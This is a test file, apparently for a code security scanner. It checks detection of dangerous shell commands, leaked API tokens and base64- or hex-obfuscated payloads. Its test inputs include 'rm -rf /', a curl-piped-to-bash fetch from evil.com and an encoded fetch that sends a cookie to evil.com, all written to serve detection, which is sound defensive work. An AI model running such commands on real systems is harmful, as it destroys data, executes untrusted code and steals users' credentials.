import { describe, it, expect } from 'vitest'
import { ALL_PATTERNS } from '@/lib/scanner/patterns'
import { scanForSecrets } from '@/lib/scanner/secrets'
import { scanObfuscation } from '@/lib/scanner/obfuscation'

describe('dangerous shell commands', () => {
  it('detects rm -rf /', () => {
    const content = 'rm -rf /'
    const findings = ALL_PATTERNS
      .map(p => p.detect(content, 'test.sh'))
      .filter(Boolean)
    expect(findings.length).toBeGreaterThanOrEqual(1)
  })

  it('detects curl|bash', () => {
    const content = 'curl -s https://evil.com/script.sh | bash'
    const findings = ALL_PATTERNS
      .map(p => p.detect(content, 'test.sh'))
      .filter(Boolean)
    expect(findings.length).toBeGreaterThanOrEqual(1)
  })
})

describe('safe content has no findings', () => {
  it('returns no findings for benign text', () => {
    const content = 'console.log("hello world")'
    const findings = ALL_PATTERNS
      .map(p => p.detect(content, 'test.js'))
      .filter(Boolean)
    expect(findings.length).toBe(0)
  })

  it('does not flag dangerous command examples in comments', () => {
    const content = [
      'const safe = true',
      '// rm -rf / is shown here as a command to avoid',
      '# chmod 777 is an insecure permission example',
    ].join('\n')
    const findings = ALL_PATTERNS
      .map(p => p.detect(content, 'docs.md'))
      .filter(Boolean)
    const commandFindings = findings.filter(f =>
      f?.title === 'Destructive delete on root' || f?.title === 'chmod 777 world-writable permissions'
    )
    expect(commandFindings.length).toBe(0)
  })
})

describe('secret detection', () => {
  it('detects OpenAI API key', () => {
    const content = 'const apiKey = "sk-' + 'a'.repeat(40) + '"'
    const secrets = scanForSecrets(content, 'env.ts')
    const openaiSecrets = secrets.filter(s => s.category === 'credential-harvesting' || s.title?.toLowerCase().includes('openai'))
    expect(openaiSecrets.length).toBeGreaterThanOrEqual(1)
  })

  it('detects GitHub token', () => {
    const content = 'token=ghp_' + 'a'.repeat(36)
    const secrets = scanForSecrets(content, 'config.ts')
    const githubSecrets = secrets.filter(s => s.title?.toLowerCase().includes('github'))
    expect(githubSecrets.length).toBeGreaterThanOrEqual(1)
  })
})

describe('obfuscation detection', () => {
  it('detects base64 encoded content', () => {
    const encoded = Buffer.from('console.log("sensitive data"); fetch("http://evil.com/?steal=" + cookie)').toString('base64')
    const content = `const x = "${encoded}"`
    const findings = scanObfuscation(content, 'payload.js')
    const base64Findings = findings.filter(f => f.title?.toLowerCase().includes('base64'))
    expect(base64Findings.length).toBeGreaterThanOrEqual(1)
  })

  it('detects hex encoded content', () => {
    const hex = Buffer.from('curl http://evil.com/').toString('hex')
    const hexEncoded = Array.from(hex).join('').replace(/(..)/g, '\\x$1')
    const content = `const x = "${hexEncoded}"`
    const findings = scanObfuscation(content, 'payload.js')
    const hexFindings = findings.filter(f => f.title?.toLowerCase().includes('hex'))
    expect(hexFindings.length).toBeGreaterThanOrEqual(1)
  })
})
